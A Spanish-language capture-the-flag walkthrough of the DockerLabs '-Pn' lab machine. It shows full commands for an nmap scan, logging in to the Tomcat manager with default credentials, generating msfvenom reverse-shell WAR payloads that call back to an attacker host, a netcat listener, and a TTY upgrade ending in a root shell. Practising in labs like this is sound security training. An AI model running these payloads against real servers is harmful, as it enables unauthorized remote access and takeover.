Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "-Pn".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh pn.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.18.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene  abierto el puerto 8080 donde corre un Tomcat.
```
8080/tcp open  http    syn-ack ttl 64 Apache Tomcat 9.0.88
|_http-title: Apache Tomcat/9.0.88
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Apache Tomcat
MAC Address: 02:42:AC:11:00:02 (Unknown)

```
Vamos pues a acceder al puerto 8080, por lo que vamos a poner la IP de la maquina victima seguida del puerto en el navegador Web y vemos que sale la pagina por defecto del Apache Tomcat.
Se puede observar tambien que hay una parte, en la linea del "tomcat9-admin" donde pone "manager webapp" donde pincharemos y se nos abrira un panel Login.
Hay que entender ahora una cosa y es que, por defecto, Apache Tomcat ya viene con unas credenciales por defecto.
Para obtenerlas, buscamos en Google "hacktricks apache tomcat default credentials" y en la propia Web de "hacktricks" iremos al siguiente enlace:
	https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
Una vez estemos en esta pagina, iremos a la seccion donde pone "Default credentials" donde se veran varias posibles contraseñas, las cuales habria que ir probando una por una
Un truquito, aunque no siempre funciona, seria darle a "Cancel" en el panel de Login, y al darnos el error 401 de "No autorizado" suelen dar las credenciales.
Pero como como acabo de decir, NO siempre funciona.
```
401 Unauthorized

You are not authorized to view this page. If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation.

That file must contain the credentials to let you use this webapp.

For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above.

	<role rolename="manager-gui"/>
    <user username="tomcat" password="s3cr3t" roles="manager-gui"/>
```
Bien, ya sabiendo el usuario y la contraseña, hacemos login, vamos al panel de administracion de Tomcat y nos ubicamos en la zona donde pone "WAR file to deploy", donde podremos subir archivos maliciosos en formato ".war" para poder ganar acceso a dicha maquina victima.
¿Y como creo un archivo malicioso? EXACTO !!! Con MSFVENOM !!!
```
msfvenom -p java/shell_reverse_tcp LHOST=IPMAQUINAATACANTE LPORT=PUERTOMAQUINAATACANTE -f war -o NOMBREARCHIVOQUEQUERAMOS.war
            
	-p java/shell_reverse_tcp = ponemos el payload reverse shell de JAVA debido a que los archivos ".war" funcionan con JAVA
```
 Una vez tengamos el archivo, lo subiremos y probaremos si funciona. ¿Por que digo probaremos si funciona? Porque lo normal es que lo haga, pero muchas veces, y dependiendo de como este hecho el servidor puede funcionar o no. Para ello, vamos a ver dos opciones (bueno, en realidad 2 Payloads diferentes):
```
1) msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.150 LPORT=443 -f war -o reverse1.war

2) msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.150 LPORT=443 -f war -o reverse2.war
```
Como he dicho antes, esto depende de come este configurado el servidor Tomcat, por lo que asi nos aseguramos que alguno de los dos funcione.
Ahora subimos los dos y nos apareceran en la pantalla de control del Tomcat Web Manager App:
```
/reverse1 	None specified 	  	true 	0 	 Start with idle ≥  minutes 
/reverse2 	None specified 	  	true 	0 	 Start with idle ≥  minutes 
```
Perfecto, ya tenemos los dos archivos subidos. Lo siguiente, COMO SIEMPRE, es ponernos a la escucha con NETCAT usando el comando:
```
nc -nlvp 443
```
y ejecutar los archivos uno por uno para ver cual de los dos funciona (o los 2 :P)
Ejecutado el primero, ya vemo que SI funciona:
```
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 36530  
```
Perfecto !! Ahora sin embargo, hay que hacer, COMO SIEMPRE, un tratamiento de la TTY escribiendo lo siguiente:
```
(El tratamiento TTY SIEMPRE es igual)

	script /dev/null -c bash
	Ahora presionamos (CTRL + Z)
	stty raw -echo; fg
	reset xterm
	export TERM=xterm
	export SHELL=bash
```
Una vez terminado el tratamiento de la TTY, vemos que ya somos "root", pero para asegurarnos, escrimos "whoami" y listo :) !!
```
root@aad1731916f7:/# whoami
root

root@aad1731916f7:/# 
```
Y en principio, con esto ya estaria la maquina "-Pn" terminada.